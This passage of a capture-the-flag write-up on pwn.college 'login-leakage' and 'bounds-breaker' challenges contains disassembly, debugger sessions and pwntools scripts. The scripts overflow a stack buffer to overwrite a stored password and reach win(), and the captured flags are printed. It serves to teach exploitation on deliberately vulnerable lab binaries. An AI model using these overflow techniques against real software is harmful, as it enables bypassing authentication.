   0x00000000000020a9 <+907>:   add    rax,0x756
   0x00000000000020af <+913>:   mov    rsi,rax
   0x00000000000020b2 <+916>:   lea    rdi,[rip+0x175f]        # 0x3818
   0x00000000000020b9 <+923>:   mov    eax,0x0
   0x00000000000020be <+928>:   call   0x1160 <printf@plt>
   0x00000000000020c3 <+933>:   mov    edi,0xa
   0x00000000000020c8 <+938>:   call   0x1120 <putchar@plt>
   0x00000000000020cd <+943>:   mov    eax,DWORD PTR [rbp-0x8]
   0x00000000000020d0 <+946>:   movsxd rdx,eax
   0x00000000000020d3 <+949>:   lea    rax,[rbp-0x770]
   0x00000000000020da <+956>:   add    rdx,rax
   0x00000000000020dd <+959>:   mov    rax,QWORD PTR [rip+0x30ac]        # 0x5190 <rp_>
   0x00000000000020e4 <+966>:   add    rax,0x2
   0x00000000000020e8 <+970>:   cmp    rdx,rax
   0x00000000000020eb <+973>:   jbe    0x2129 <challenge+1035>
   0x00000000000020ed <+975>:   lea    rdi,[rip+0x174c]        # 0x3840
   0x00000000000020f4 <+982>:   call   0x1140 <puts@plt>
   0x00000000000020f9 <+987>:   lea    rdi,[rip+0x1798]        # 0x3898
   0x0000000000002100 <+994>:   call   0x1140 <puts@plt>
   0x0000000000002105 <+999>:   lea    rdi,[rip+0x17dc]        # 0x38e8
   0x000000000000210c <+1006>:  call   0x1140 <puts@plt>
   0x0000000000002111 <+1011>:  lea    rdi,[rip+0x1818]        # 0x3930
   0x0000000000002118 <+1018>:  call   0x1140 <puts@plt>
   0x000000000000211d <+1023>:  lea    rdi,[rip+0x1851]        # 0x3975
   0x0000000000002124 <+1030>:  call   0x1140 <puts@plt>
   0x0000000000002129 <+1035>:  lea    rdi,[rip+0x184f]        # 0x397f
   0x0000000000002130 <+1042>:  call   0x1140 <puts@plt>
   0x0000000000002135 <+1047>:  lea    rax,[rbp-0x770]
   0x000000000000213c <+1054>:  lea    rdx,[rax+0x756]
   0x0000000000002143 <+1061>:  lea    rax,[rbp-0x770]
   0x000000000000214a <+1068>:  mov    rsi,rdx
   0x000000000000214d <+1071>:  mov    rdi,rax
   0x0000000000002150 <+1074>:  call   0x11a0 <strcmp@plt>
   0x0000000000002155 <+1079>:  test   eax,eax
   0x0000000000002157 <+1081>:  je     0x216f <challenge+1105>
   0x0000000000002159 <+1083>:  lea    rdi,[rip+0x1838]        # 0x3998
   0x0000000000002160 <+1090>:  call   0x1140 <puts@plt>
   0x0000000000002165 <+1095>:  mov    edi,0x1
   0x000000000000216a <+1100>:  call   0x11e0 <exit@plt>
   0x000000000000216f <+1105>:  lea    rdi,[rip+0x1842]        # 0x39b8
   0x0000000000002176 <+1112>:  call   0x1140 <puts@plt>
   0x000000000000217b <+1117>:  mov    eax,0x0
   0x0000000000002180 <+1122>:  call   0x1c17 <win>
   0x0000000000002185 <+1127>:  lea    rdi,[rip+0x1843]        # 0x39cf
   0x000000000000218c <+1134>:  call   0x1140 <puts@plt>
   0x0000000000002191 <+1139>:  mov    eax,0x0
   0x0000000000002196 <+1144>:  leave
   0x0000000000002197 <+1145>:  ret
End of assembler dump.
```

We can see that the `challenge()` function calls `strcmp@plt` to comare two strings pointed to by the `rsi` and `rdi` registers.
This is the password verification mechanism.
If the strings are identical, the reault which is in `rax` is `0`.

After using `test` to check if `rax=0`, the program jumps to `challenge+1105` if the condition is met, and calls `win()`. Else, it exits.

Let's set a breakpoint at `challenge+1074`, right before the call to `strcmp@plt` is made.

```
pwndbg> break *(challenge+1074)
Breakpoint 1 at 0x2150
```

```
pwndbg> run
Starting program: /challenge/login-leakage-easy 
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:

# --- snip ---

Our stack pointer points to 0x7ffc037530b0, and our base pointer points to 0x7ffc03753850.
This means that we have (decimal) 246 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 1968 bytes.
The input buffer begins at 0x7ffc037530e0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 54 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge is a password checker that will check your input against a randomly generated password.
The password is stored at 0x7ffc03753836, 1878 bytes after the start of your input buffer.
We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
Payload size: 8
You have chosen to send 8 bytes of input!
This will allow you to write from 0x7ffc037530e0 (the start of the input buffer)
right up to (but not including) 0x7ffc037530e8 (which is -46 bytes beyond the end of the buffer).
Send your payload (up to 8 bytes)!
abcdefgh
You sent 8 bytes!
Let's see what happened with the stack:

# --- snip ---

The program's memory status:
- the input buffer starts at 0x7ffc037530e0
- the password buffer starts at 0x7ffc03753836

Checking Password...

Breakpoint 1, 0x000058dbd29d0150 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────
 RAX  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
 RBX  0x58dbd29d0230 (__libc_csu_init) ◂— endbr64 
 RCX  0x7a0266883297 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 RDI  0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
 RSI  0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 R8   0x15
 R9   0x2f
 R10  0x58dbd29d183a ◂— 0x415700000000000a /* '\n' */
 R11  0x246
 R12  0x58dbd29cf200 (_start) ◂— endbr64 
 R13  0x7fff0b3b48a0 ◂— 1
 R14  0
 R15  0
 RBP  0x7fff0b3b3780 —▸ 0x7fff0b3b47b0 ◂— 0
 RSP  0x7fff0b3b2fe0 ◂— 0
 RIP  0x58dbd29d0150 (challenge+1074) ◂— call strcmp@plt
──────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────
 ► 0x58dbd29d0150 <challenge+1074>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
        s2: 0x7fff0b3b3766 ◂— 0xd7dab6104a159525
 
   0x58dbd29d0155 <challenge+1079>    test   eax, eax
   0x58dbd29d0157 <challenge+1081>    je     challenge+1105              <challenge+1105>
 
   0x58dbd29d0159 <challenge+1083>    lea    rdi, [rip + 0x1838]     RDI => 0x58dbd29d1998 ◂— 'Password check failed! Exiting!'
   0x58dbd29d0160 <challenge+1090>    call   puts@plt                    <puts@plt>
 
   0x58dbd29d0165 <challenge+1095>    mov    edi, 1                  EDI => 1
   0x58dbd29d016a <challenge+1100>    call   exit@plt                    <exit@plt>
 
   0x58dbd29d016f <challenge+1105>    lea    rdi, [rip + 0x1842]     RDI => 0x58dbd29d19b8 ◂— 'Password check passed!'
   0x58dbd29d0176 <challenge+1112>    call   puts@plt                    <puts@plt>
 
   0x58dbd29d017b <challenge+1117>    mov    eax, 0                  EAX => 0
   0x58dbd29d0180 <challenge+1122>    call   win                         <win>
────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────
00:0000│ rsp     0x7fff0b3b2fe0 ◂— 0
01:0008│-798     0x7fff0b3b2fe8 —▸ 0x7fff0b3b48b8 —▸ 0x7fff0b3b6698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-790     0x7fff0b3b2ff0 —▸ 0x7fff0b3b48a8 —▸ 0x7fff0b3b667a ◂— '/challenge/login-leakage-easy'
03:0018│-788     0x7fff0b3b2ff8 ◂— 0x100000000
04:0020│-780     0x7fff0b3b3000 ◂— 0
05:0028│-778     0x7fff0b3b3008 ◂— 2
06:0030│ rax rdi 0x7fff0b3b3010 ◂— 0x6161 /* 'aa' */
07:0038│-768     0x7fff0b3b3018 ◂— 0
──────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────
 ► 0   0x58dbd29d0150 challenge+1074
   1   0x58dbd29d021e main+134
   2   0x7a0266799083 __libc_start_main+243
   3   0x58dbd29cf22e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can see that the program compares the first bytes of our payload to the saved password. Ideally, it would compare the saved password with some random number.

Let change the value pointed to by `rdi` to be same as the one pointed to by `rsi`.

```
pwndbg> set *(unsigned long*)$rdi = *(unsigned long*)$rsi
pwndbg> c
Continuing.
Password check passed!
You win! Here is your flag:

  ERROR: Failed to open the flag -- Permission denied!
  Your effective user id is not 0!
  You must directly run the suid binary in order to have the correct permissions!
[Inferior 1 (process 1362) exited with code 0377]
```

We can see that the program calls `win()` for us if the values turn out to be the same.

### Exploit

Since, we control the first 8 bytes of our payload that we write into the buffer, and the challenge also tells us the address of the buffer and the stored address, we can easily set both values to the same string.

That way, the check will succeed and the challenge will call `win()` for us.

```py title="~/script.py showLineNumbers
from pwn import *

p = process('/challenge/login-leakage-easy')

# Initialize values
buffer_addr = 0x7ffccd0bfbe0
password_addr = 0x7ffccd0c0336
addr_of_saved_bp = 0x7ffe2e4a66a0
password = 0xdeadbeeffacade00

# Calculate offset & payload_size
offset = password_addr - buffer_addr
payload_size = offset + 8

# Build payload
payload = p64(password)
payload += b"A" * (offset - 8)
payload += p64(password)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~login-leakage-easy:/$ python ~/script.py 
[+] Starting local process '/challenge/login-leakage-easy': pid 4616
/home/hacker/script.py:23: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(bytes_to_read))
[*] Switching to interactive mode
 (up to 1886 bytes)!
You sent 1886 bytes!
Let's see what happened with the stack:

# --- snip ---

The program's memory status:
- the input buffer starts at 0x7ffe8b13d3b0
- the password buffer starts at 0x7ffe8b13db06

Checking Password...
Password check passed!
You win! Here is your flag:
pwn.college{YCCUOqCpOZtJeDomtA34lWAsydW.QXwgzN4EDL4ITM0EzW}


Goodbye!
[*] Got EOF while reading in interactive
$
```

&nbsp;

## Login leakage (Hard)

> Leverage memory corruption to satisfy a simple constraint

```
hacker@program-security~login-leakage-hard:/$ /challenge/login-leakage-hard 
Payload size: 2
Send your payload (up to 2 bytes)!
aa
Password check failed! Exiting!
```

In this challenge we do not get any information from running the program.

Requirements to craft an exploit:

* [ ] Location of buffer
* [ ] Location of password

```
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000001000  _init
0x0000000000001100  __cxa_finalize@plt
0x0000000000001110  __errno_location@plt
0x0000000000001120  puts@plt
0x0000000000001130  write@plt
0x0000000000001140  printf@plt
0x0000000000001150  geteuid@plt
0x0000000000001160  close@plt
0x0000000000001170  read@plt
0x0000000000001180  strcmp@plt
0x0000000000001190  setvbuf@plt
0x00000000000011a0  open@plt
0x00000000000011b0  __isoc99_scanf@plt
0x00000000000011c0  exit@plt
0x00000000000011d0  strerror@plt
0x00000000000011e0  _start
0x0000000000001210  deregister_tm_clones
0x0000000000001240  register_tm_clones
0x0000000000001280  __do_global_dtors_aux
0x00000000000012c0  frame_dummy
0x00000000000012c9  bin_padding
0x00000000000018b3  win
0x00000000000019ba  challenge
0x0000000000001b3c  main
0x0000000000001bd0  __libc_csu_init
0x0000000000001c40  __libc_csu_fini
0x0000000000001c48  _fini
pwndbg> 
```

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000000019ba <+0>:     endbr64
   0x00000000000019be <+4>:     push   rbp
   0x00000000000019bf <+5>:     mov    rbp,rsp
   0x00000000000019c2 <+8>:     sub    rsp,0x670
   0x00000000000019c9 <+15>:    mov    DWORD PTR [rbp-0x654],edi
   0x00000000000019cf <+21>:    mov    QWORD PTR [rbp-0x660],rsi
   0x00000000000019d6 <+28>:    mov    QWORD PTR [rbp-0x668],rdx
   0x00000000000019dd <+35>:    lea    rdx,[rbp-0x640]
   0x00000000000019e4 <+42>:    mov    eax,0x0
   0x00000000000019e9 <+47>:    mov    ecx,0xc6
   0x00000000000019ee <+52>:    mov    rdi,rdx
   0x00000000000019f1 <+55>:    rep stos QWORD PTR es:[rdi],rax
   0x00000000000019f4 <+58>:    mov    esi,0x0
   0x00000000000019f9 <+63>:    lea    rdi,[rip+0x70c]        # 0x210c
   0x0000000000001a00 <+70>:    mov    eax,0x0
   0x0000000000001a05 <+75>:    call   0x11a0 <open@plt>
   0x0000000000001a0a <+80>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000001a0d <+83>:    lea    rax,[rbp-0x640]
   0x0000000000001a14 <+90>:    lea    rcx,[rax+0x628]
   0x0000000000001a1b <+97>:    mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001a1e <+100>:   mov    edx,0x8
   0x0000000000001a23 <+105>:   mov    rsi,rcx
   0x0000000000001a26 <+108>:   mov    edi,eax
   0x0000000000001a28 <+110>:   call   0x1170 <read@plt>
   0x0000000000001a2d <+115>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000001a30 <+118>:   mov    edi,eax
   0x0000000000001a32 <+120>:   call   0x1160 <close@plt>
   0x0000000000001a37 <+125>:   mov    QWORD PTR [rbp-0x648],0x0
   0x0000000000001a42 <+136>:   lea    rdi,[rip+0x6d0]        # 0x2119
   0x0000000000001a49 <+143>:   mov    eax,0x0
   0x0000000000001a4e <+148>:   call   0x1140 <printf@plt>
   0x0000000000001a53 <+153>:   lea    rax,[rbp-0x648]
   0x0000000000001a5a <+160>:   mov    rsi,rax
   0x0000000000001a5d <+163>:   lea    rdi,[rip+0x6c4]        # 0x2128
   0x0000000000001a64 <+170>:   mov    eax,0x0
   0x0000000000001a69 <+175>:   call   0x11b0 <__isoc99_scanf@plt>
   0x0000000000001a6e <+180>:   mov    rax,QWORD PTR [rbp-0x648]
   0x0000000000001a75 <+187>:   mov    rsi,rax
   0x0000000000001a78 <+190>:   lea    rdi,[rip+0x6b1]        # 0x2130
   0x0000000000001a7f <+197>:   mov    eax,0x0
   0x0000000000001a84 <+202>:   call   0x1140 <printf@plt>
   0x0000000000001a89 <+207>:   mov    rdx,QWORD PTR [rbp-0x648]
   0x0000000000001a90 <+214>:   lea    rax,[rbp-0x640]
   0x0000000000001a97 <+221>:   mov    rsi,rax
   0x0000000000001a9a <+224>:   mov    edi,0x0
   0x0000000000001a9f <+229>:   call   0x1170 <read@plt>
   0x0000000000001aa4 <+234>:   mov    DWORD PTR [rbp-0x8],eax
   0x0000000000001aa7 <+237>:   cmp    DWORD PTR [rbp-0x8],0x0
   0x0000000000001aab <+241>:   jns    0x1ad9 <challenge+287>
   0x0000000000001aad <+243>:   call   0x1110 <__errno_location@plt>
   0x0000000000001ab2 <+248>:   mov    eax,DWORD PTR [rax]
   0x0000000000001ab4 <+250>:   mov    edi,eax
   0x0000000000001ab6 <+252>:   call   0x11d0 <strerror@plt>
   0x0000000000001abb <+257>:   mov    rsi,rax
   0x0000000000001abe <+260>:   lea    rdi,[rip+0x693]        # 0x2158
   0x0000000000001ac5 <+267>:   mov    eax,0x0
   0x0000000000001aca <+272>:   call   0x1140 <printf@plt>
   0x0000000000001acf <+277>:   mov    edi,0x1
   0x0000000000001ad4 <+282>:   call   0x11c0 <exit@plt>
   0x0000000000001ad9 <+287>:   lea    rax,[rbp-0x640]
   0x0000000000001ae0 <+294>:   lea    rdx,[rax+0x628]
   0x0000000000001ae7 <+301>:   lea    rax,[rbp-0x640]
   0x0000000000001aee <+308>:   mov    rsi,rdx
   0x0000000000001af1 <+311>:   mov    rdi,rax
   0x0000000000001af4 <+314>:   call   0x1180 <strcmp@plt>
   0x0000000000001af9 <+319>:   test   eax,eax
   0x0000000000001afb <+321>:   je     0x1b13 <challenge+345>
   0x0000000000001afd <+323>:   lea    rdi,[rip+0x67c]        # 0x2180
   0x0000000000001b04 <+330>:   call   0x1120 <puts@plt>
   0x0000000000001b09 <+335>:   mov    edi,0x1
   0x0000000000001b0e <+340>:   call   0x11c0 <exit@plt>
   0x0000000000001b13 <+345>:   lea    rdi,[rip+0x686]        # 0x21a0
   0x0000000000001b1a <+352>:   call   0x1120 <puts@plt>
   0x0000000000001b1f <+357>:   mov    eax,0x0
   0x0000000000001b24 <+362>:   call   0x18b3 <win>
   0x0000000000001b29 <+367>:   lea    rdi,[rip+0x687]        # 0x21b7
   0x0000000000001b30 <+374>:   call   0x1120 <puts@plt>
   0x0000000000001b35 <+379>:   mov    eax,0x0
   0x0000000000001b3a <+384>:   leave
   0x0000000000001b3b <+385>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+314` right before the call to `strcmp@plt` is made.

```
pwndbg> break *(challenge+314)
Breakpoint 1 at 0x58d45125faf4
```

```
pwndbg> run
Starting program: /challenge/login-leakage-hard 
Payload size: 2
Send your payload (up to 2 bytes)!
aa

Breakpoint 1, 0x00005ceaa0cb5af4 in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
 RBX  0x5ceaa0cb5bd0 (__libc_csu_init) ◂— endbr64 
 RCX  0x7827536e01f2 (read+18) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  0x7ffd75791218 ◂— 0x4071f3148c64193a
 RDI  0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
 RSI  0x7ffd75791218 ◂— 0x4071f3148c64193a
 R8   0x23
 R9   0x23
 R10  0x5ceaa0cb614c ◂— ' bytes)!\n'
 R11  0x246
 R12  0x5ceaa0cb51e0 (_start) ◂— endbr64 
 R13  0x7ffd75792350 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd75791230 —▸ 0x7ffd75792260 ◂— 0
 RSP  0x7ffd75790bc0 ◂— 0
 RIP  0x5ceaa0cb5af4 (challenge+314) ◂— call strcmp@plt
──────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x5ceaa0cb5af4 <challenge+314>    call   strcmp@plt                  <strcmp@plt>
        s1: 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
        s2: 0x7ffd75791218 ◂— 0x4071f3148c64193a
 
   0x5ceaa0cb5af9 <challenge+319>    test   eax, eax
   0x5ceaa0cb5afb <challenge+321>    je     challenge+345               <challenge+345>
 
   0x5ceaa0cb5afd <challenge+323>    lea    rdi, [rip + 0x67c]     RDI => 0x5ceaa0cb6180 ◂— 'Password check failed! Exiting!'
   0x5ceaa0cb5b04 <challenge+330>    call   puts@plt                    <puts@plt>
 
   0x5ceaa0cb5b09 <challenge+335>    mov    edi, 1                 EDI => 1
   0x5ceaa0cb5b0e <challenge+340>    call   exit@plt                    <exit@plt>
 
   0x5ceaa0cb5b13 <challenge+345>    lea    rdi, [rip + 0x686]     RDI => 0x5ceaa0cb61a0 ◂— 'Password check passed!'
   0x5ceaa0cb5b1a <challenge+352>    call   puts@plt                    <puts@plt>
 
   0x5ceaa0cb5b1f <challenge+357>    mov    eax, 0                 EAX => 0
   0x5ceaa0cb5b24 <challenge+362>    call   win                         <win>
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd75790bc0 ◂— 0
01:0008│-668     0x7ffd75790bc8 —▸ 0x7ffd75792368 —▸ 0x7ffd75793698 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-660     0x7ffd75790bd0 —▸ 0x7ffd75792358 —▸ 0x7ffd7579367a ◂— '/challenge/login-leakage-hard'
03:0018│-658     0x7ffd75790bd8 ◂— 0x100000000
04:0020│-650     0x7ffd75790be0 ◂— 0
05:0028│-648     0x7ffd75790be8 ◂— 2
06:0030│ rax rdi 0x7ffd75790bf0 ◂— 0x6161 /* 'aa' */
07:0038│-638     0x7ffd75790bf8 ◂— 0
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0   0x5ceaa0cb5af4 challenge+314
   1   0x5ceaa0cb5bc2 main+134
   2   0x7827535f6083 __libc_start_main+243
   3   0x5ceaa0cb520e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffd75790bf0`
* [x] Location of password: `0x7ffd75791218`

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/login-leakage-hard')

# Initialize values
buffer_addr = 0x7ffd75790bf0
password_addr = 0x7ffd75791218
# addr_of_saved_bp = 0x7ffe2e4a66a0
password = 0xdeadbeeffacade00

# Calculate offset & payload_size
offset = password_addr - buffer_addr
payload_size = offset + 8

# Build payload
payload = p64(password)
payload += b"A" * (offset - 8)
payload += p64(password)

# Send number of bytes
p.recvuntil(b'Payload size: ')
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~login-leakage-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/login-leakage-hard': pid 475
/home/hacker/script.py:22: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to 1584 bytes)!
[*] Process '/challenge/login-leakage-hard' stopped with exit code 0 (pid 475)
Password check passed!
You win! Here is your flag:
pwn.college{MQmBteRVgsAkLzTDm3hAjp7roKm.QXxgzN4EDL4ITM0EzW}


Goodbye!
[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Bounds Breaker (Easy)

> Overflow a buffer and smash the stack to obtain the flag, but this time bypass a check designed to prevent you from doing so!

```
hacker@program-security~bounds-breaker-easy:~$ /challenge/bounds-breaker-easy 
###
### Welcome to /challenge/bounds-breaker-easy!
###

The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 00 00 00 00 | 0x0000000016845951 |
| 0x00007ffcefa6de80 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
| 0x00007ffcefa6df08 (rsp+0x00b8) | dd 28 40 00 00 00 00 00 | 0x00000000004028dd |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffcefa6de50, and our base pointer points to 0x7ffcefa6df00.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffcefa6de80, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 106 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffcefa6df08, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (106 to fill the buffer,
30 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

Payload size: 2
This challenge is more careful: it will check to make sure you
don't want to provide so much data that the input buffer will
overflow. But recall twos compliment, look at how the check is
implemented, and try to beat it!
You made it past the check! Because the read() call will interpret
your size differently than the check above, the resulting read will
be unstable and might fail. You will likely have to try this several
times before your input is actually read.
You have chosen to send 2 bytes of input!
This will allow you to write from 0x7ffcefa6de80 (the start of the input buffer)
right up to (but not including) 0x7ffcefa6de82 (which is -104 bytes beyond the end of the buffer).
Of these, you will overwrite -134 bytes into the return address.
If that number is greater than 8, you will overwrite the entire return address.

You will want to overwrite the return value from challenge()
(located at 0x7ffcefa6df08, 136 bytes past the start of the input buffer)
with 0x4020f3, which is the address of the win() function.
This will cause challenge() to return directly into the win() function,
which will in turn give you the flag.
Keep in mind that you will need to write the address of the win() function
in little-endian (bytes backwards) so that it is interpreted properly.

Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffcefa6de50 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffcefa6de58 (rsp+0x0008) | 38 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f038 |
| 0x00007ffcefa6de60 (rsp+0x0010) | 28 f0 a6 ef fc 7f 00 00 | 0x00007ffcefa6f028 |
| 0x00007ffcefa6de68 (rsp+0x0018) | 23 27 9a 16 01 00 00 00 | 0x00000001169a2723 |
| 0x00007ffcefa6de70 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffcefa6de78 (rsp+0x0028) | 51 59 84 16 02 00 00 00 | 0x0000000216845951 |
| 0x00007ffcefa6de80 (rsp+0x0030) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffcefa6de88 (rsp+0x0038) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de90 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6de98 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dea8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6deb8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dec8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded0 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6ded8 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee0 (rsp+0x0090) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffcefa6dee8 (rsp+0x0098) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffcefa6def0 (rsp+0x00a0) | 30 ef a6 ef 02 00 00 00 | 0x00000002efa6ef30 |
| 0x00007ffcefa6def8 (rsp+0x00a8) | 80 de a6 ef fc 7f 00 00 | 0x00007ffcefa6de80 |
| 0x00007ffcefa6df00 (rsp+0x00b0) | 30 ef a6 ef fc 7f 00 00 | 0x00007ffcefa6ef30 |
